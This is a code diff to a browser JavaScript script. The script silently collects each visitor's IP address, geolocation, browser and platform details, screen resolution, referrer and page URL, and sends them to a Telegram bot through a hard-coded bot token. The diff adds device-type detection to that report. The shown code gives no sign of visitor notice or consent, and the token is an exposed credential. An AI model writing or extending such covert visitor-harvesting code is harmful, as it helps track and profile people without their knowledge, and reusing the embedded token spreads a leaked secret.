@@ -39,6 +39,18 @@ function getScreenResolution() {
     };
 }
 
+// Function to determine device type
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile/i.test(ua)) {
+        return 'Mobile';
+    } else if (/tablet/i.test(ua)) {
+        return 'Tablet';
+    } else {
+        return 'Desktop';
+    }
+}
+
 // Function to send data to Telegram bot
 async function sendToTelegram(message) {
     const botToken = '7772131223:AAHoGl6iKgAq9DFKwlMXziG86sQe60e3jpg';
@@ -73,6 +85,7 @@ async function logUserInfo() {
     const geolocation = await getGeolocation(ip);
     const browserInfo = getBrowserInfo();
     const screenResolution = getScreenResolution();
+    const deviceType = getDeviceType();
     const referrer = document.referrer;
     const pageURL = window.location.href;
     const timestamp = new Date().toISOString();
@@ -82,6 +95,7 @@ async function logUserInfo() {
         geolocation,
         browserInfo,
         screenResolution,
+        deviceType,
         referrer,
         pageURL,
         timestamp,
@@ -98,6 +112,7 @@ async function logUserInfo() {
         Platform: ${userInfo.browserInfo.platform}
         Language: ${userInfo.browserInfo.language}
         Screen Resolution: ${userInfo.screenResolution.width}x${userInfo.screenResolution.height}
+        Device Type: ${userInfo.deviceType}
         Referrer: ${userInfo.referrer}
         Page URL: ${userInfo.pageURL}
         Timestamp: ${userInfo.timestamp}
